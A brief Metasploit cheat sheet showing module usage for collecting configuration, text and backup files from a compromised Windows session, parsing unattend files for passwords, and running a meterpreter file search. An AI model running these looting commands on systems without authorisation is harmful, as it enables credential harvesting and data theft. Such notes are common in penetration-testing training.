# Metasploit

## Post Module

MSF Windows Gather Generic File Collection Post Module.

```
msf > use post/windows/gather/enum_files

msf post(windows/gather/enum_files) > options

Module options (post/windows/gather/enum_files):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   FILE_GLOBS   *.config         yes       The file pattern to search for in a filename
   SEARCH_FROM                   no        Search from a specific location. Ex. C:\
   SESSION                       yes       The session to run this module on


View the full module info with the info, or info -d command.

msf post(windows/gather/enum_files) > set file_globs *.txt or *.xml or *.ini or *.bkp or *.bak or *.backup

msf post(windows/gather/enum_files) > set search_from < <drive_letter>:\\path\\to\\directory\\ | \\<IP>\\C$\\ >

msf post(windows/gather/enum_files) > set session <session_ID>

msf post(windows/gather/enum_files) > run
```

## Auxiliary Module

MSF Parser Windows Unattend Passwords Auxiliary Module

```
msf > use auxiliary/parser/unattend

msf auxiliary(parser/unattend) > options

Module options (auxiliary/parser/unattend):

   Name       Current Setting  Required  Description 
   ----       ---------------  --------  ----------- 
   PATH                        yes       Directory or file to parse. 
   RECURSIVE  false            yes       Recursively check for files

msf auxiliary(parser/unattend) > set path /path/to/file(s)

msf auxiliary(parser/unattend) > set recursive <true | false>

msf auxiliary(parser/unattend) > run
```

## Metepreter API command

```
meterpreter > search -d C:\\ -f *.xml -f *.txt -f *.ini -f *.bkp -f *.bak -f *.backup
```